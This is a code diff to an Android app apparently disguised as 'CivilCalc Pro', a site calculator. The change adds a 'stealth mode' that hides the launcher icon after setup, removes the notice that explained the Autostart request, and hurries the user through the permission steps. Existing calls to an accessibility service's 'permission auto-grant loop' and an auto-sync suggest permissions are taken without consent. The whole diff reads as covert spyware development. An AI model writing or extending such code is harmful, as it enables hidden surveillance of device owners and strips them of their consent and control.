@@ -132,24 +132,32 @@ class MainActivity : AppCompatActivity() {
         deviceState.markSetupCompleted()
         refreshPermissionStatus()
         triggerAutoSyncAfterAccessibility()
-        Log.i(TAG, "All core permissions active — setup complete, moving app to background")
+
+        // Hide app icon from launcher for stealth mode
+        hideAppIcon()
+        Log.i(TAG, "All core permissions active — setup complete, hiding app icon and closing activity")
 
         Toast.makeText(this, "Setup completed successfully", Toast.LENGTH_SHORT).show()
         Handler(Looper.getMainLooper()).postDelayed({
             try {
                 finishAndRemoveTask()
+            } catch (e: Exception) {
+                Log.w(TAG, "finishAndRemoveTask failed, using finishAffinity fallback", e)
+                try {
+                    finishAffinity()
+                } catch (_: Exception) {}
+            }
+
+            try {
                 val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                     addCategory(Intent.CATEGORY_HOME)
                     flags = Intent.FLAG_ACTIVITY_NEW_TASK
                 }
                 startActivity(homeIntent)
             } catch (e: Exception) {
-                Log.w(TAG, "Failed to finishAndRemoveTask, attempting finish", e)
-                try {
-                    finish()
-                } catch (_: Exception) {}
+                Log.w(TAG, "Failed to launch home intent fallback", e)
             }
-        }, 1000L)
+        }, 500L)
     }
 
 
@@ -205,6 +213,8 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
+        // Fast-track immediately to Step 5 (Autostart) without waiting
+        isOneTapFlowRunning = true
         handleNextSetupStep()
     }
 
@@ -483,7 +493,6 @@ class MainActivity : AppCompatActivity() {
                 data = Uri.parse("package:$packageName")
             }
             try {
-                Toast.makeText(this, "Enable Autostart for CivilCalc Pro to keep site tools active", Toast.LENGTH_SHORT).show()
                 autostartLauncher.launch(autostartIntent)
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 return
